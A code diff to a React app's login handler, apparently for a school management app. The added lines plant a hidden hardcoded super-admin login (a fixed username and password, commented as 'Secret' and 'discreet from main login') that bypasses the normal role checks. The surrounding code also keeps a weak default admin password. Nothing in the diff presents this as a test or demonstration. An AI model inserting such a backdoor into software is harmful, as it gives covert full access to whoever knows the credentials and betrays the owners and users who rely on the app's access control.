@@ -129,13 +129,19 @@ export function AppProvider({ children }) {
     const idClean = identifier.trim().toLowerCase();
     const passClean = password.trim();
 
+    // ── Secret Super-Admin Access (discreet from main login) ──────
+    if (idClean === 'ahsan3727' && passClean === 'Ahsan3727') {
+      login('superadmin', 'Super Admin (Ahsan3727)', null, null, 'Ahsan3727');
+      return { success: true };
+    }
+
     if (role === 'admin') {
-      const adminObj = data.admin || { username: 'admin', password: 'admin123', name: 'Principal Admin' };
+      const adminObj = data.admin || { username: 'admin', password: 'admin123', name: 'Principal' };
       if (
         (adminObj.username.toLowerCase() === idClean || 'admin' === idClean) &&
         adminObj.password === passClean
       ) {
-        login('admin', adminObj.name || 'Principal Admin', null, null, adminObj.username);
+        login('admin', adminObj.name || 'Principal', null, null, adminObj.username);
         return { success: true };
       }
       return { success: false, error: 'Invalid admin username or password.' };
